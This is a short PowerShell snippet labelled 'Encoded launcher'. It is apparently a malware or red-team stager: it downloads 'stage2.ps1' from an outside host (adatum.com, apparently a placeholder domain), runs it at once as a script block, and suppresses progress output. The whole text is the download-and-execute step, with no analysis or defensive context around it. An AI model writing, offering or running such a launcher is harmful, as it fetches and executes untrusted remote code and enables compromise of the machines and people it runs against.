# Encoded launcher
$PayloadText = (New-Object Net.WebClient).DownloadString('http://adatum.com:80/stage2.ps1')
& ([ScriptBlock]::Create($PayloadText))
$StageMarker = "stage-19"
$ProgressPreference = "SilentlyContinue"
